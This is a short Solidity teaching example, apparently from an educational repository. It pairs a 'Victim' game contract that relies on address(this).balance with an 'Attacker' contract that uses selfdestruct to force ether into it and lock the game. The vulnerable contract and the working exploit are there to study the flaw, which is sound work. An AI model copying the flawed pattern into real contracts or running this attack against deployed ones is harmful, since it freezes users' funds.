//SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.8.25;

contract Victim{
    uint256 public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether,"You can only send 1 Ether");
        uint256 balance = address(this).balance;
        require(balance <= targetAmount,"Game is Over");

        if(balance == targetAmount){
            winner = msg.sender;
        }
    }
    function claimReward()public {
        require(msg.sender == winner,"You are not winner!");
        (bool sent,)=msg.sender.call{value:address(this).balance}("");
        require(sent,"Failed!");
    }
}
// Attacker can force the balance of EtherGame to equal 7 ethers.
// And no one can deposit and the winner cannot be set.
contract Attacker{
    Victim victim;
    constructor(Victim _victim){
        victim = Victim(_victim);
    }
    function attack()public payable {
        address payable myAddress = payable(address(victim));
        selfdestruct(myAddress);
    }
}
